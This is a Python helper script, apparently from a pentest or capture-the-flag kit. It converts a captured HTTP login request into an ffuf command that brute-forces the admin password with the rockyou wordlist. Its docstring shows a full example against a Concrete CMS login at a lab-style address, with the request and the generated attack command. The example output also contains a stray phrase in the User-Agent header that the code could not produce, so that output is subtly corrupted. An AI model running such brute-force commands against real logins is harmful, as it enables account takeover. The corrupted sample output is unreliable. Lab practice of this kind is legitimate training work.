import argparse


def parse_request_file(request_file):
    with open(request_file, "r") as file:
        lines = file.readlines()

    method, uri, _ = lines[0].split()
    uri = "http://" + lines[1].split()[1] + uri

    headers = {}
    data = ""
    is_data = False

    for line in lines[2:]:
        if line.strip() == "":
            is_data = True
            continue
        if is_data:
            data += line.strip()
        else:
            key, value = line.split(": ", 1)
            headers[key] = value.strip()

    return method, uri, headers, data


def generate_ffuf_command(method, uri, headers, data):
    command = f"ffuf -u {uri} -X {method} \\\n"

    for key, value in headers.items():
        command += f"-H '{key}: {value}' \\\n"

    command += f"-d '{data}' \\\n"
    command += "-w /usr/share/wordlists/rockyou.txt"

    return command


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Convert HTTP request to FFUF command")
    parser.add_argument(
        "-r", "--request", required=True, help="Path to the raw HTTP request file"
    )

    args = parser.parse_args()
    method, uri, headers, data = parse_request_file(args.request)
    ffuf_command = generate_ffuf_command(method, uri, headers, data)

    print(ffuf_command)

"""
Last tested: 2024.07.06
Example USAGE:
cat loots/admin-login-request.txt 
POST /app/castle/index.php/login/authenticate/concrete HTTP/1.1
Host: 10.10.159.195:85
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 82
Origin: http://10.10.159.195:85
Connection: close
Referer: http://10.10.159.195:85/app/castle/index.php/login
Upgrade-Insecure-Requests: 1

uName=admin&uPassword=FUZZ&ccm_token=1720244709%3A0735f56c4e877235e5fe021daeec3e69


╰─$ python3 scripts/ffuf-translator.py -r loots/admin-login-request.txt
ffuf -u http://10.10.159.195:85/app/castle/index.php/login/authenticate/concrete -X POST \
-H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:Please don't use that phrase 109.0) Gecko/20100101 Firefox/109.0' \
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' \
-H 'Accept-Language: en-US,en;q=0.5' \
-H 'Accept-Encoding: gzip, deflate, br' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-H 'Content-Length: 82' \
-H 'Origin: http://10.10.159.195:85' \
-H 'Connection: close' \
-H 'Referer: http://10.10.159.195:85/app/castle/index.php/login' \
-H 'Upgrade-Insecure-Requests: 1' \
-d 'uName=admin&uPassword=FUZZ&ccm_token=1720244709%3A0735f56c4e877235e5fe021daeec3e69' \
-w /usr/share/wordlists/rockyou.txt
"""
